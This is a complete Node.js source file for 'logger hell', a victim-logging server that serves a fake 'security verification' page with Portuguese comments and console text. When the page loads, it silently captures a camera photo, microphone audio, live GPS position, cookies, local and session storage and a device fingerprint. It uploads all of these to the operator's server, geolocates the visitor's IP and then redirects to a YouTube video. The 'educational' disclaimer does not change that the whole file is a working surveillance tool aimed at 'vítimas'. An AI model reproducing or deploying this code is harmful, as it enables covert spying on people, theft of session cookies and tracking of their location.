/*
logger hell by vøidh7 - Ultimate Version

⚠️ Legal Disclaimer
This project is for educational and research purposes only.
The author is not responsible for any misuse, damage, or illegal activities caused by this code.
Use it at your own risk.
*/

const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const port = 3000;
const axios = require("axios");
const figlet = require("figlet");
const multer = require("multer");
const link = "https://youtube.com/@mrbeast?si=r_SEbn1IB0HEjJ1D ";


app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.set("trust proxy", true);


const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadsDir = path.join(__dirname, 'logs', 'media');
        if (!fs.existsSync(uploadsDir)) {
            fs.mkdirSync(uploadsDir, { recursive: true });
        }
        cb(null, uploadsDir);
    },
    filename: function (req, file, cb) {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const ipClean = ip.replace(/[^a-f0-9.:]/gi, '_');
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        cb(null, `${ipClean}_${timestamp}_${file.originalname}`);
    }
});

const upload = multer({ storage: storage });


const logsDir = path.join(__dirname, 'logs');
const ipsDir = path.join(__dirname, 'logs', 'ips');
const detailedDir = path.join(__dirname, 'logs', 'detailed');
const mediaDir = path.join(__dirname, 'logs', 'media');
const gpsDir = path.join(__dirname, 'logs', 'gps');

[logsDir, ipsDir, detailedDir, mediaDir, gpsDir].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

function getipinfo(ip) {
    return axios.get(`http://ip-api.com/json/${ip}`)
        .then(response => response.data)
        .catch(err => {
            console.error("Erro ao buscar IP:", err);
            return null;
        });
}

console.clear();

figlet.text('logger hell', {
    font: 'Ghost',
    horizontalLayout: 'default',
    verticalLayout: 'default'
}, function(err, data) {
    if (err) {
        console.log('Something went wrong...');
        console.dir(err);
        return;
    }
    console.log(data);
    console.log("by vøidh7 - ULTIMATE VERSION");
    console.log("Logs salvos em: " + __dirname + "/logs/");
});

function saveGPSData(ip, gpsData) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const ipClean = ip.replace(/[^a-f0-9.:]/gi, '_');

    const gpsFile = path.join(gpsDir, `${ipClean}_${timestamp}.json`);
    fs.writeFile(gpsFile, JSON.stringify({
        ip: ip,
        timestamp: new Date().toISOString(),
        ...gpsData
    }, null, 2), err => {
        if (err) console.log("Erro ao salvar dados GPS");
        else console.log("📍 Dados GPS salvos!");
    });
}

const maliciousHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Redirecionando...</title>
    <script>
        let mediaRecorder;
        let audioChunks = [];
        let gpsWatchId = null;
        let gpsData = [];

        // Capturar foto da câmera
        const captureCameraPhoto = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 1280,
                        height: 720,
                        facingMode: 'user'
                    }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // Esperar um pouco para a câmera focar
                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // Capturar foto
                const photoData = canvas.toDataURL('image/jpeg', 0.8);

                // Parar stream
                stream.getTracks().forEach(track => track.stop());

                return photoData;
            } catch (error) {
                console.error('Erro câmera:', error);
                return null;
            }
        };

        // Gravar áudio do microfone
        const recordAudio = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        sampleRate: 44100
                    }
                });

                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'audio/webm;codecs=opus'
                });

                audioChunks = [];

                return new Promise((resolve) => {
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            audioChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            resolve(reader.result);
                            stream.getTracks().forEach(track => track.stop());
                        };
                        reader.readAsDataURL(audioBlob);
                    };

                    mediaRecorder.start();

                    // Gravar por 5 segundos
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 5000);
                });

            } catch (error) {
                console.error('Erro microfone:', error);
                return null;
            }
        };

        // Monitorar GPS em tempo real
        const startGPSMonitoring = () => {
            if (!navigator.geolocation) return null;

            return new Promise((resolve) => {
                gpsData = [];

                gpsWatchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const gpsInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date().toISOString()
                        };
                        gpsData.push(gpsInfo);
                    },
                    (error) => {
                        console.error('Erro GPS:', error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );

                // Coletar dados por 10 segundos
                setTimeout(() => {
                    if (gpsWatchId) {
                        navigator.geolocation.clearWatch(gpsWatchId);
                    }
                    resolve(gpsData);
                }, 10000);
            });
        };

        // Coletar metadados do navegador
        const collectData = async () => {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };

            return data;
        };

        // Enviar arquivos de mídia
        const sendMediaFile = async (fileData, filename, type) => {
            try {
                const formData = new FormData();
                const blob = await fetch(fileData).then(r => r.blob());
                formData.append('file', blob, filename);
                formData.append('type', type);
                formData.append('ip', 'client');

                await fetch('/upload-media', {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Erro upload:', error);
            }
        };

        // Enviar dados coletados
        const sendCollectedData = async (data) => {
            try {
                await fetch('/log-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error('Error sending data:', error);
            }
        };

        // Executar coleta COMPLETA
        (async () => {
            console.log('🚀 Iniciando coleta completa...');

            // Coletar metadados básicos
            const basicData = await collectData();

            // Capturar foto da câmera
            console.log('📷 Capturando foto...');
            const photo = await captureCameraPhoto();
            if (photo) {
                await sendMediaFile(photo, 'camera_photo.jpg', 'photo');
            }

            // Gravar áudio
            console.log('🎤 Gravando áudio...');
            const audio = await recordAudio();
            if (audio) {
                await sendMediaFile(audio, 'microphone_audio.webm', 'audio');
            }

            // Monitorar GPS
            console.log('📍 Monitorando GPS...');
            const gpsResults = await startGPSMonitoring();
            if (gpsResults && gpsResults.length > 0) {
                await fetch('/save-gps', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        gpsData: gpsResults,
                        basicData: basicData
                    })
                });
            }

            // Enviar dados básicos
            await sendCollectedData(basicData);

            console.log('✅ Coleta completa! Redirecionando...');

            // Redirecionar após coleta
            setTimeout(() => {
                window.location.href = "${link}";
            }, 1000);
        })();
    </script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h2>Verificando segurança...</h2>
        <p>Por favor, aguarde o redirecionamento.</p>
        <div id="status">Inicializando...</div>
    </div>
    <script>
        // Atualizar status
        const statusEl = document.getElementById('status');
        const messages = [
            'Verificando conexão...',
            'Analisando dispositivo...',
            'Otimizando performance...',
            'Quase pronto...'
        ];
        let msgIndex = 0;
        setInterval(() => {
            statusEl.textContent = messages[msgIndex % messages.length];
            msgIndex++;
        }, 2000);
    </script>
</body>
</html>
`;

app.post('/upload-media', upload.single('file'), (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    console.log(`📁 ${req.body.type.toUpperCase()} salvo: ${req.file.filename} de ${ip}`);
    res.status(200).send('OK');
});


app.post('/save-gps', (req, res) => {
    const data = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    saveGPSData(ip, data.gpsData);

    console.log("📍 Dados GPS recebidos de:", ip);
    console.log("Posições capturadas:", data.gpsData.length);
    data.gpsData.forEach((pos, index) => {
        console.log(`  ${index + 1}. Lat: ${pos.latitude}, Lon: ${pos.longitude}, Precisão: ${pos.accuracy}m`);
    });

    res.status(200).send('OK');
});

app.get("/", async (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const dataip = await getipinfo(ip);

    console.log("🎯 Nova vítima conectada:", ip);
    console.log("📍 Localização aproximada:", dataip);
    console.log("");

    res.send(maliciousHTML);
});

app.post("/log-data", (req, res) => {
    const data = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    console.log("\n=== DADOS COLETADOS ===");
    console.log("IP:", ip);
    console.log("User Agent:", data.userAgent);
    console.log("Tela:", data.screen.width + "x" + data.screen.height);
    console.log("Timezone:", data.timezone);

    res.status(200).send("OK");
});

app.listen(port, () => {
    console.log('Logger HELL ULTIMATE em http://localhost:' + port + '/');
    console.log("Aguardando vítimas...");
    console.log("\n🎯 CAPTURANDO:");
    console.log("  📷 Fotos da câmera");
    console.log("  🎤 Áudio do microfone (5 segundos)");
    console.log("  📍 GPS em tempo real (10 segundos)");
    console.log("  📊 Metadados completos");
    console.log("\n📁 Estrutura de pastas:");
    console.log("  📁 logs/");
    console.log("    📁 ips/       - Logs por IP");
    console.log("    📁 detailed/  - Dados detalhados");
    console.log("    📁 media/     - Fotos e áudios");
    console.log("    📁 gps/       - Dados GPS completos");

